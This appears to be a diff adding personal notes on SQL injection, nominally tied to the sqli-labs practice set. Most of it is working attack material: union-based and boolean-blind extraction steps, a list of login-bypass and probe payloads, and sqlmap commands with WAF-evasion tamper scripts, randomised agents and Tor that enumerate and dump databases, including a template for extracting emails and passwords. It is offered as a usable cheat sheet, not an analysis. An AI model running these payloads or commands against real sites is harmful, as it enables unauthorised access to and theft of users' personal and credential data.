@@ -1,0 +1,111 @@
+Database -> tables-> columns -> database: {Encrypted, Plain}
+Data : name, id, email, phone no, username, password, Credit card, address
+
+Classification of SQL injection:
+1. Error Based
+2. Union Based
+3. Blind SQLI - Time Based, Boolean Based
+
+Type of SQLI:
+1. Get Based - geturls
+2. Post Based - login form, signup form, contacts
+3. Header Based - headers
+4. Cookie Based - cookie
+
+Attack Type:
+1. Automated tools
+2. Manually
+
+labs : github.com/Audi-1/sqli-labs Download it and paste \xampp\htdocs to here
+
+Union Based - Get Based:
+01. use \ and try to use balancer
+02. use +order+by+ for finding how many column
+03. use +union+all+select for finding vulnerable table number 
+04. for find database use database() and find user() where is vulnerable table number
+05. for find full database use "Union Base > Database > Database Name group contact"
+06. for find full tables use "Union base > table > Table Name group contact"
+07. For find full Columns use "Union base > columns > Column Name group Concat"
+08. For find full data use "Union base > data > data group contact"
+
+Post Based:
+01. Use \ and try to use -- or # or {-- } for balancing
+02. use ' order by 3# for finding how many column
+03. use ' union all select 1,2# for finding vulnerable table number 
+04. use ' union all select version(),2# for finding version
+05. use ' union all select version(),database()# for finding version and database
+06. for find full database use "Union Base > Database > Database Name group contact"
+07. for find full tables use "Union base > table > Table Name group contact"
+08. For find full data use "Union base > data > data group contact"
+
+Note : replace space with +
+
+Boolean Based:
+
+Suppose Database name is security
+' OR substring(database(), 1,1)="s"
+' OR substring(database(), 2,1)="e"
+' OR substring(database(), 3,1)="c"
+' OR substring(database(), 4,1)="u"
+' OR substring(database(), 5,1)="r"
+' OR substring(database(), 6,1)="i"
+' OR substring(database(), 7,1)="t"
+' OR substring(database(), 8,1)="y"
+
+payload:
+' OR 1=1 #
+" OR 1=1 #
+') OR 1=1 #
+") OR 1=1 #
+?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||' <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+/?q=")
+/?q=')
+/?q=-x()
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1-
+/?q=1
+/?q=1\
+/?q=1/'/
+/?q=1/!1111'/
+/?q=1-sleep()
+/?q=1 and sleep()
+
+
+cd /usr/share/sqlmap/tamper
+
+sqlmap --help
+sudo apt install tor
+service tor status
+sqlmap --update
+
+▶ sqlmap -u "link with parameter" --dbs --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries 
+▶ sqlmap -u "link with parameter" -D [database name] –tables --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries 
+▶ sqlmap -u "link with parameter" -D [database name] –T [table name] –columns --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries 
+▶ sqlmap -u "link with parameter" -D [database name] –T [table name] –columns --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries 
+▶ sqlmap -u "link with parameter" -D [database name] –T [table name] –C [ column name, column name] --dump --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries 
+
+
+-> First Find the vulnerable paremeter
+-> Use order by or +order+by+ and find how many column
+-> Use union all select or +union+all+select+ find vulnerable column
+-> Then you use Mysql Dios in vulnerable column  as a example:
+concat(,0x3d,)   from db_name
+
+concat(id,0x3d,fullname,0x3d,email,0x3d,password,0x3d,photos,0x3d,status)
